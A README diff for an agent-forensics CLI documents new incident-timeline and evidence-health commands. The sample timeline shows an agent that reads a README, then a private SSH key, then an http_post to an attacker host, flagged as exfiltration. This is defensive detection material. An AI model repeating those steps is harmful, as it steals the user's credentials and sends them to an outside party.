@@ -104,6 +104,55 @@ step 7  tool_end    leaked SSH key
 
 That is the forensic narrative an analyst can put in a report.
 
+### Incident timeline: what executed, under whose authority, where evidence is missing (beta)
+
+```bash
+air incident chain.jsonl --finding ASI02
+```
+
+One row per record, three columns an incident review actually asks about. Authority comes from the records the chain already carries: a `DELEGATION` genesis, a `HUMAN_APPROVAL` releasing a halted action, a declared scope, a key transition, an anchor. A step with none of them is labelled `agent-key`: only the agent's own signing key vouches for it. Evidence is `anchored`, `signed`, `gap` (AIR-04 found missing evidence), or `unverified` (past a verification failure).
+
+```
+    #  time      step         what executed                        authority                    evidence
++   2  00:50:56  tool_start   read_file(path=./README.md)          agent-key: 9edd68682ff2b1fc  signed
++   3  00:50:56  tool_end     # auth module This module handl...   agent-key: 9edd68682ff2b1fc  signed
++   4  00:50:56  llm_start    Here is the README I just read...    agent-key: 9edd68682ff2b1fc  signed
+         findings: AIR-01
++   6  00:50:56  tool_start   read_file(path=/home/dev/.ssh/id_rsa) agent-key: 9edd68682ff2b1fc  signed
++   7  00:50:56  tool_end     -----BEGIN OPENSSH PRIVATE KEY---... agent-key: 9edd68682ff2b1fc  signed
+*   8  00:50:56  tool_start   http_post(url=http://attacker.ex...  agent-key: 9edd68682ff2b1fc  gap
+         findings: AIR-02, AIR-04, ASI02
+
+  Where the evidence is missing
+    - step 8: tool_start for `http_post` is not followed by a matching tool_end. Tool outcome is not in the chain.
+    - no external anchor: timing rests on the agent's own clock and signing key (run air anchor)
+```
+
+`--step <n>` focuses on one step instead of a detector; `--full` shows every record; `--json` dumps the model. The terminal timeline is free. `--output incident.md` writes the Markdown pack you attach to the ticket and requires a license.
+
+### Evidence health: is the record complete, and is verification working? (beta)
+
+```bash
+air health .air/          # one chain file, or a directory of them
+```
+
+Eight offline checks per chain, each with the numbers behind it and the command that fixes it. The level is the worst check. Exit code is non-zero on a failure (or on a warning with `--strict`), so it runs from cron or CI next to the agent.
+
+```
+  WARN  10 record(s)
+
+  OK     Chain integrity       10 record(s) verify and link
+  OK     Key custody           1 signing key(s), 0 authorized rotation(s)
+  OK     Verification support  every signature algorithm present (ed25519) is verifiable here
+  WARN   Completeness          1 of 3 tool call(s) never recorded an outcome
+  WARN   External anchoring    no anchor record: timing rests on the agent's own clock and key (run air anchor)
+  WARN   Authority binding     no delegation, approval, or declared scope: only the agent signing key vouches for every step
+  OK     Detectors             14 of 16 detectors ran, 5 finding(s) (3 critical, 2 high); ASI03 / ASI10 need --agent-registry
+  OK     Freshness             newest record is 2 min old
+```
+
+Anchors are counted, not re-verified; that is `air verify-public`. Free everywhere.
+
 ### Layer 3: containment with Auth0-verified step-up
 
 Halt the agent before a high-stakes action runs. Require an authenticated human to approve. Record the approval as part of the chain.
@@ -427,6 +476,8 @@ air verify <chain>        Verify chain integrity (signatures + chain links)
 air verify-public <chain> Verify the chain using only public infrastructure
 air anchor <chain>        Force-emit an anchor record covering the unanchored tail
 air explain <chain>       Causal explanation: --step <id> | --finding <detector_id>
+air incident <chain>      Incident timeline: what executed, under whose authority, where evidence is missing (beta)
+air health <chain|dir>    Evidence health: eight checks, exit non-zero on failure (beta)
 air approve               Layer 3 step-up approval: --token | --device | --authorize-url
 air report article72      Generate EU AI Act Article 72 post-market monitoring template
 air report security-review  Answer an enterprise security review from the agent's own chain (beta)
